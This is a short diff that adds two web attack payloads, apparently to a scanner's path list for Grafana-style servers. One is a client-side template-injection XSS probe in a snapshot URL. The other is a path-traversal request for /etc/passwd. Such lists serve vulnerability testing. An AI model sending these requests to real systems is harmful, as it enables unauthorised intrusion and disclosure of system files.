@@ -1,0 +1,2 @@
+/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1
+/public/plugins/welcome/../../../../../../../../etc/passwd
